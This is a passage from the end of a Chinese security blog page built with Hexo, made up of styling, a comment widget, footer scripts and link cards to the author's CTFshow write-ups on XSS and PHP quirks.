        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    /* 修复评论第一行位置错位 */
    .v .vlist .vcard {
    padding-top: 2.5em !important ;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div id="vcomments" class="card-content"></div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>

<script>
    new Valine({
        el: '#vcomments',
        admin_email: '1362034357@qq.com',
        appId: 'XXXXXXXXXXXXXXX',
        appKey: 'XXXXXXXXXXXXXX',
        path: window.location.pathname,
        comment_count: true,
        notify: 'false' === 'true',
        verify: 'true' === 'true',
        visitor: 'true' === 'true',
        avatar: 'monsterid',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go',

    });
    $(document).ready(function(){
        $("#vcomments").on('click', 'span.vat',function(){
            $(this).parent('div.vmeta').next("div.vcontent").after($("div.vwrap"));
            $('textarea#veditor').focus();
        })
    })
</script>
<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
<script type="text/javascript">
    jinrishici.load(function(result) {
        var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author
        document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
    });
</script>
    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/08/06/ctfshow-zhi-web-wu/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/14.jpg" class="responsive-img" alt="CTFshow之web(五)">
                        
                        <span class="card-title">CTFshow之web(五)</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            XSS平台document.cookie 获取饼干的js代码
推荐xss平台：http://xsscom.com/ ， https://xss.pt/JavaScript的 document.cookie 将以字符串的方式返回所有的cook
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-08-06
                        </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTFshow/" class="post-category" target="_blank">
                                    CTFshow
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/XSS/" target="_blank">
                        <span class="chip bg-color">XSS</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/07/12/ctfshow-zhi-web-san/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/14.jpg" class="responsive-img" alt="CTFshow之web(三)">
                        
                        <span class="card-title">CTFshow之web(三)</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            PHP特性web89&lt;?php

include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
  
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-07-12
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTFshow/" class="post-category" target="_blank">
                                    CTFshow
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/php特性/" target="_blank">
                        <span class="chip bg-color">php特性</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Yn8rt<br />'
            + '作者: 杨大炮<br />'
            + '链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>

<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fa fa-list"></i>
    </a>
</div>


<script src="https://cdn.bootcss.com/tocbot/4.8.1/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            // headingsOffset: -205,
            headingSelector: 'h1, h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).slideUp(500);
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).slideDown(500);
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>
    

</main>


<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
    MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
    });
</script>

		<svg aria-hidden="true" style="position: absolute; overflow: hidden; width: 0; height: 0">
        <symbol id="icon-sun" viewBox="0 0 1024 1024">
          <path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path>
          <path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path>
          <path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path>
          <path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path>
        </symbol>
        <symbol id="icon-moon" viewBox="0 0 1024 1024">
          <path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path>
          <path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path>
        </symbol>
      </svg>
      <a onclick="switchNightMode()" class="icon-V hidden" title="切换主题">
        <svg width="48" height="48" viewBox="0 0 1024 1024">
          <use id="modeicon" xlink:href="#icon-moon"></use>
        </svg>
      </a>
<script>
      function checkNightMode() {
        '1' === localStorage.getItem('isDark') ? ($('body').addClass('DarkMode'), $('#changeMode-top').removeClass('fa-moon').addClass('fa-sun'), $('#modeicon').attr('xlink:href', '#icon-sun')) : '0' === localStorage.getItem('isDark') ? $('#modeicon').attr('xlink:href', '#icon-moon') : new Date().getHours() >= 20 || new Date().getHours() < 7 ? ($('body').addClass('DarkMode'), $('#changeMode-top').removeClass('fa-moon').addClass('fa-sun'), $('#modeicon').attr('xlink:href', '#icon-sun')) : matchMedia('(prefers-color-scheme: dark)').matches ? ($('body').addClass('DarkMode'), $('#changeMode-top').removeClass('fa-moon').addClass('fa-sun'), $('#modeicon').attr('xlink:href', '#icon-sun')) : $('#modeicon').attr('xlink:href', '#icon-moon')
      }
      function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
          setTimeout(function () {
            $('body').hasClass('DarkMode') ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#changeMode-top').removeClass('fa-sun').addClass('fa-moon'), $('#modeicon').attr('xlink:href', '#icon-moon')) : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#changeMode-top').removeClass('fa-moon').addClass('fa-sun'), $('#modeicon').attr('xlink:href', '#icon-sun')),
              setTimeout(function () {
                $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                  $(this).remove()
                })
              }, 2e3)
          })
      }
      function switchNightModeTop() {
        $('body').hasClass('DarkMode') ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#changeMode-top').removeClass('fa-sun').addClass('fa-moon'), $('#modeicon').attr('xlink:href', '#icon-moon')) : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#changeMode-top').removeClass('fa-moon').addClass('fa-sun'), $('#modeicon').attr('xlink:href', '#icon-sun'))
      }
    </script>
        <footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            
            Copyright&copy; 2020 Yn8rt | Powered by Hexo | Theme Matery
            <!-- 备案信息配置
            Copyright&copy; 2019 luckyzmj.cn | <a href="http://www.beian.miit.gov.cn/">备案</a>
            <br>
            
             <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=备案号"><img src="http://www.luckyzmj.cn/medias/gaba.png" /> 备案号</a>
             -->
             <br>
             
            <span id="sitetime"></span><span class="my-face">ღゝ◡╹)ノ♡</span>
            <br>

            

            
                    
                        <span id="busuanzi_container_site_pv" style='display:none'></span>
                        总访问量: <span id="busuanzi_value_site_pv" class="white-color"></span>
                    
        
                    
                        <span id="busuanzi_container_site_uv" style='display:none'></span>
                        人次&nbsp; | &nbsp;访客人数: <span id="busuanzi_value_site_uv" class="white-color"></span> 人
                    
    
            

            
                &nbsp; | &nbsp;字数统计:&nbsp;
                <span class="white-color">116.1k</span> 字
            

            
            <br>

        </div>

        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/iceberg404" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fa fa-github"></i>
    </a>


 
    <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1362034357@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>






    <a href="http://wpa.qq.com/msgrd?v=3&uin=1362034357&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>



    <a href="https://weibo.com/冰山CK" class="tooltipped" target="_blank" data-tooltip="关注我的微博" data-position="top" data-delay="50">
        <i class="fa fa-weibo"></i>
    </a>



    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fa fa-rss"></i>
    </a>
</div>

    </div>
</footer>

<div class="progress-bar"></div>

<!-- 不蒜子计数初始值纠正 -->
<script>
    $(document).ready(function () {

        var int = setInterval(fixCount, 50);
        var pvcountOffset = 300;
        var uvcountOffset = 300;

        function fixCount() {
            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
                clearInterval(int);
            }
            if ($("#busuanzi_container_site_pv").css("display") != "none") {
                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
                clearInterval(int);
            }
        }
    });
</script>

<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();

        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
        year - 作为date对象的年份，为4位年份值
        month - 0-11之间的整数，做为date对象的月份
        day - 1-31之间的整数，做为date对象的天数
        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
        minutes - 0-59之间的整数，做为date对象的分钟数
        seconds - 0-59之间的整数，做为date对象的秒数
        microseconds - 0-999之间的整数，做为date对象的毫秒数 */

        var t1 = Date.UTC(2020, 12, 17, 00, 00, 00); //北京时间2019-8-1 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes *
            minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "本站已勉强运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours +
            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒" ;
    } /*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
    siteTime();
</script>






        <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
        <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>

		
        <script src="https://cdn.bootcss.com/materialize/1.0.0/js/materialize.min.js"></script>
        <script src="https://cdn.bootcss.com/masonry/4.0.0/masonry.pkgd.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
        <script src="https://cdn.bootcss.com/scrollprogress/3.0.2/scrollProgress.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.11/js/lightgallery-all.min.js"></script>
        <script src="/js/matery.js"></script>

        <!-- Global site tag (gtag.js) - Google Analytics -->



        
            <script src="/libs/others/clicklove.js"></script>
        

        
            <script async src="/libs/others/busuanzi.pure.mini.js"></script>
        

        <script type="text/javascript">
            var OriginTitile = document.title,
                st;
            document.addEventListener("visibilitychange", function () {
                document.hidden ? (document.title = "404 Not-Found", clearTimeout(st)) : (document.title =
                    "(๑•̀ㅂ•́) ✧被发现了～", st = setTimeout(function () {
                        document.title = OriginTitile
                    }, 3e3))
            })
        </script>

        <!-- 鼠标点击烟花爆炸效果 -->
        
            <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 1; pointer-events: none;"></canvas>
            <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
            <script type="text/javascript" src="/js/fireworks.js"></script>
        

        <!-- 背景雪花飘落特效 -->
        

        <!-- 鼠标点击文字特效 -->
        
        

        <!-- 背景雪花飘落特效 -->
        

        <!-- 在线聊天工具  -->
        

        <!-- 背景 canvas-nest -->
        

        <!-- 背景静止彩带  -->
        

        <!-- 背景动态彩带 -->
        
            <script type="text/javascript">
            var windowWidth = $(window).width();
            if (windowWidth > 992) {
                document.write('<script type="text/javascript" src="/libs/background/ribbon-dynamic.js"><\/script>');
            }
            </script>
        

        <!-- 天气接口控件   -->
        
            <script type="text/javascript">
            WIDGET = {FID: 'zLkJSQpqsh'}
            </script>
        <!-- <script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script> -->

        <script type="text/javascript">
          var windowWidth = $(window).width();
          if (windowWidth > 768) {
              document.write('<script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"><\/script>');
          }
        </script>
        
        
          <script>
            (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/410f202e.js","daovoice")
  daovoice('init', {
      app_id: "XXXXX"
    });
  daovoice('update');
  </script>
        

    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"live2d-widget-model-shizuku"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=i;var e=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}i(),n.addEventListener("scroll",function(){var t,e;t=i,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
</html>